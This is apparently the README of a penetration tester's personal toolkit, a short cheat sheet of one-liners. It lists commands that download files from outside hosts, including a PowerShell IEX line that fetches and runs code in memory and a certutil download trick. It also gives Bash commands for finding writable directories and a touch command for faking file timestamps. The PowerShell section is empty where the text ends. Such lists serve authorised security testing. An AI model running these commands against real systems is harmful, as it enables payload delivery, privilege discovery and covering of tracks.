# Toolkit
A collection of scripts / payloads and so on which I have found to be helpful during engagements.

## One-Liners

### File download
`powershell (New-Object System.Net.WebClient).DownloadFile('https://domain.com/file.exe', 'file.exe')`  
`powershell IEX (New-Object System.Net.WebClient).DownloadString('http://127.0.0.1/file.exe')`  
`certutil.exe -urlcache -f https://domain.com/file.exe file.exe`  
`wget https://domain.com/file.exe -o file.exe`  
`wget --ftp-user=User --ftp-password=ftp://127.0.0.1/file.exe -o file.exe`  

### Bash
| Command | Description |
|-----------------------------------------|----------------------------------------------------------|
| `find / -perm -222 -type d 2>/dev/null` | Prints all the directories the user has write access to. |
| `find / -type f -group [GROUP] 2>/dev/null` | Prints any special permissions for GROUP. |
| `touch -a -m -t 202104251300.10 [FILE]` | Change access / last modified time of FILE to 25/04/2021 13:00.10 |
|||

### PowerShell
